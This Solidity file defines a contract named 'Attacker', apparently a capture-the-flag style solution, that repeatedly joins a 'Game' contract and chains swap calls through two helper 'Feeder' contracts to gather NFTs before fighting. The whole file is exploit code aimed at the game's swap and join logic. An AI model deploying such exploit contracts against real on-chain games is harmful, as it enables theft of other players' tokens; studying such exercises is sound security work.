// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "./Game.sol";
import "./Feeder.sol";

contract Attacker is IERC721Receiver
{
    Game public game;
    Feeder feed1;
    Feeder feed2;
    uint256 nfts_sent = 0;

    constructor(address _game)
    {
        game = Game(_game);

        game.join();

        feed1 = new Feeder(_game);
        feed2 = new Feeder(_game);
    }

    function getEmAll() public
    {
        game.swap(address(feed1), 3, 6);
    }

    function getNext() public
    {
        nfts_sent++;
        if(nfts_sent == 3)
        {
            game.join();
        }
        else if (nfts_sent == 6)
        {
            game.join();
        }

        if (nfts_sent < 3)
        {
            game.swap(address(feed1), 3+nfts_sent, 6+nfts_sent);
        } 
        else if (nfts_sent < 6)
        {
            game.swap(address(feed2), 9+nfts_sent, 6+nfts_sent);
        }
    }

    function fightEmAll() public
    {
        game.fight();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4)
    {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}